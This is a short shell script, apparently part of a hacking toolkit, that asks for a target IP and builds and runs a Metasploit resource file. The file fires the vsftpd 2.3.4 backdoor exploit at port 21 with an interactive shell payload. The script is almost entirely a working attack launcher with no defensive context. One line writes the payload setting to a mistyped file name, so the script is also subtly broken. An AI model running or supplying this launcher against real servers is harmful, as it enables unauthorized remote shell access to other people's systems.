#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'                                                       
green='\033[1;32m'
red='\033[1;31m'                                                        
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install


echo -e "$cyan"
read -p "                  ip----->" ip
cd $HOME/Virus4/.msf
echo "use exploit/unix/ftp/vsftpd_234_backdoor" > .3msf.rc
echo "set payload cmd/unix/interact" >> .3msf.$
echo "set RHOST $ip" >> .3msf.rc
echo "set RPORT 21" >> .3msf.rc
echo "exploit" >> .3msf.rc
msfconsole -r .3msf.rc
